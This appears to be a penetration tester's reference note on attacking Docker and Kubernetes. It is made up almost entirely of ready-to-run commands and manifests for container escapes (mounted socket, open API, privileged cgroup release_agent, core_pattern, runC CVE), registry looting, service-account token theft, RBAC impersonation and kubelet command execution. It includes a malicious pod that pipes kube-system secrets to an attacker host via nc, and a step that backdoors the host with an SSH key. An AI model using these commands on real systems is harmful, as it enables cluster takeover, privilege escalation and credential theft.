---
title: "Container Security Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - reference-note
  - docker
  - kubernetes
  - containers
  - escape
  - privilege-escalation
---

# Container Security Reference

Docker and Kubernetes attack techniques — container escapes, registry attacks, and cluster compromise.

**Related Notes:**
- [[Linux-Privilege-Escalation-Reference]]
- [[Linux-Persistence-Reference]]
- [[Network-Pivoting-Reference]]

---

## Docker

### Enumeration Tools

```bash
# Dockscan — security audit scanner
dockscan unix:///var/run/docker.sock
dockscan -r html -o myreport -v tcp://example.com:5422

# DEEPCE — Docker Enumeration, Escalation of Privileges and Container Escapes
./deepce.sh
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
./deepce.sh --no-enumeration --exploit SOCK --shadow
./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
```

---

### Escape: Mounted Docker Socket

**Prerequisite:** Docker socket mounted as a volume (`/var/run/docker.sock:/var/run/docker.sock`)

Common in Portainer and similar management UIs.

```bash
# Enumerate containers
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json

# Create and start a new container
curl -XPOST --unix-socket /var/run/docker.sock \
  -d '{"Image":"nginx"}' \
  -H 'Content-Type: application/json' \
  http://localhost/containers/create

# Auto-exploit with ed tool
./ed_linux_amd64 -path=/var/run/ -autopwn=true
# Then: chroot /host && clear
```

---

### Escape: Open Docker API Port

**Prerequisite:** Docker started with `-H tcp://0.0.0.0:2376`

```bash
# Verify open Docker API
nmap -sCV 10.10.10.10 -p 2376

# Mount host filesystem into new container
export DOCKER_HOST=tcp://10.10.10.10:2376
docker run --name shell --rm -i -v /:/mnt -u 0 -t ubuntu bash
# Host filesystem accessible at /mnt — backdoor: add SSH key to /mnt/root/.ssh/

# Direct API interaction
docker -H open.docker.socket:2375 ps
docker -H open.docker.socket:2375 exec -it mysql /bin/bash

# TLS-enabled API
curl --insecure -X POST -H "Content-Type: application/json" \
  https://tls-docker:2376/containers/create?name=test \
  -d '{"Image":"alpine","Cmd":["/usr/bin/tail","-f","1234","/dev/null"],"Binds":["/:/mnt"],"Privileged":true}'
```

---

### Escape: Insecure Docker Registry

```bash
# Fingerprint: look for Docker-Distribution-Api-Version header
curl https://registry.example.com/v2/_catalog

# List image tags
curl https://registry.example.com/v2/<image>/tags/list

# With credentials
curl -s -k --user "admin:admin" https://docker.registry.local/v2/_catalog
curl -s -k --user "admin:admin" https://docker.registry.local/v2/app/manifests/latest

# Download a blob
curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/app/blobs/sha256:<hash>' > out.tar.gz

# Automated pull
python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local

# Login and pull
docker login -u admin -p admin docker.registry.local
docker pull docker.registry.local/app
docker run -it docker.registry.local/app /bin/bash
```

---

### Escape: Privileged Container (cgroup v1)

**Prerequisite:** Container started with `--privileged` or `--cap-add=SYS_ADMIN`

```bash
# In container: mount cgroup, set release_agent to a host-side script
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Write command to execute on host
echo '#!/bin/sh' > /cmd
echo "ps aux > ${host_path}/output" >> /cmd
chmod a+x /cmd

# Trigger execution
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Read output
cat /output
```

---

### Escape: coredumps + core_pattern

```bash
# 1. Find overlay mount point
mount | head -n 1

# 2. Copy evil binary to container filesystem root
cp /tmp/poc /poc

# 3. Hijack core_pattern to execute our binary on the host
echo "|/var/lib/docker/overlay2/<hash>/diff/poc" > /proc/sys/kernel/core_pattern

# 4. Generate a crash to trigger coredump
# compile crash.c: int main(){char b[1];for(int i=0;i<100;i++)b[i]=1;return 0;}
gcc -o crash crash.c && ./crash
```

---

### Escape: runC (CVE-2019-5736)

Overwrites the host runc binary — requires running commands as root inside a container.

```bash
git clone https://github.com/twistlock/RunC-CVE-2019-5736
docker build -t cve-2019-5736 ./RunC-CVE-2019-5736/malicious_image_POC
docker run --rm cve-2019-5736
```

---

### Escape: Privileged Container via Kernel Module

```bash
git clone https://github.com/xcellerator/linux_kernel_hacking
cd 3_RootkitTechniques/3.8_privileged_container_escaping
make
docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu
# Inside container:
cd /root && ./escape && ./execute

# Use proc files created by module:
echo "cat /etc/passwd" > /proc/escape
cat /proc/output
```

---

## Kubernetes

### Check Container Environment

```bash
# Service account token (auto-mounted)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# K8s API server details from env
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT

# Check for privileged mode
ls /dev/kmsg   # exists = likely privileged

# Find tmpfs mounts (Secrets/ConfigMaps)
grep -F "tmpfs ro" /etc/mtab

# Find persistent volumes
grep -wF "ext4" /etc/mtab
```

### Information Gathering

```bash
# Check service account permissions
kubectl auth can-i --list
kubectl auth can-i --list --namespace=kube-system

# Via curl (from inside pod)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
MASTER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

curl "${MASTER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  --header "Authorization: Bearer ${TOKEN}" \
  --header "Content-Type: application/json" \
  --data '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'${NAMESPACE}'"}}'
```

### Kubernetes API Endpoints

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
MASTER="https://<master_ip>:<port>"

# List pods
curl -v -H "Authorization: Bearer $TOKEN" $MASTER/api/v1/namespaces/default/pods/

# List secrets
curl -v -H "Authorization: Bearer $TOKEN" $MASTER/api/v1/namespaces/default/secrets/
curl -v -H "Authorization: Bearer $TOKEN" $MASTER/api/v1/namespaces/kube-system/secrets/

# List deployments
curl -v -H "Authorization: Bearer $TOKEN" $MASTER/apis/extensions/v1beta1/namespaces/default/deployments

# Insecure API
curl -k https://<IP>:8080
# Secure API swagger
curl -k https://<IP>:6443/swaggerapi

# Kubelet API
curl -k https://<IP>:10250/pods
curl -k https://<IP>:10250/metrics

# etcd API
curl -k https://<IP>:2379/version
etcdctl --endpoints=http://<MASTER_IP>:2379 get / --prefix --keys-only
```

### RBAC Exploitation

```bash
# Impersonate privileged account
curl -k -XGET \
  -H "Authorization: Bearer <JWT>" \
  -H "Impersonate-Group: system:masters" \
  -H "Impersonate-User: null" \
  $MASTER/api/v1/namespaces/kube-system/secrets/
```

### Malicious Pod — Steal kube-system Secrets

```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
    - name: alpine
      image: alpine
      command: ["/bin/sh"]
      args:
        - "-c"
        - 'apk add curl --no-cache; TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token); curl -k -H "Authorization: Bearer $TOKEN" https://<master>:8443/api/v1/namespaces/kube-system/secrets | nc -nv <attacker> 6666; sleep 100000'
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
kubectl apply -f malicious-pod.yaml
```

### Malicious RoleBinding — Escalate to Cluster Admin

```json
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "RoleBinding",
  "metadata": {"name": "malicious-rolebinding", "namespaces": "default"},
  "roleRef": {"apiGroup": "*", "kind": "ClusterRole", "name": "admin"},
  "subjects": [{"kind": "ServiceAccount", "name": "sa-comp", "namespace": "default"}]
}
```

```bash
curl -k -X POST \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  $MASTER/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
  -d @malicious-RoleBinding.json
```

### Accessible Kubelet (Anonymous Auth)

```bash
# List pods on node
curl -ks https://worker:10250/pods

# Execute commands in container
curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
  -d 'input=1' -d 'output=1' -d 'tty=1' \
  -d 'command=id' -d 'command=/'
```

### BadPods — Privileged Pod Manifests

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
```

### Useful K8s Attack Tools

| Tool | Purpose |
|------|---------|
| `kubectl auth can-i --list` | Check SA permissions |
| KubeHound | Kubernetes attack graph |
| kube-hunter | Hunt for K8s weaknesses |
| kubeaudit | Audit cluster security |
| kube-bench | CIS Benchmark checks |
| badpods | Ready-made privileged pod manifests |
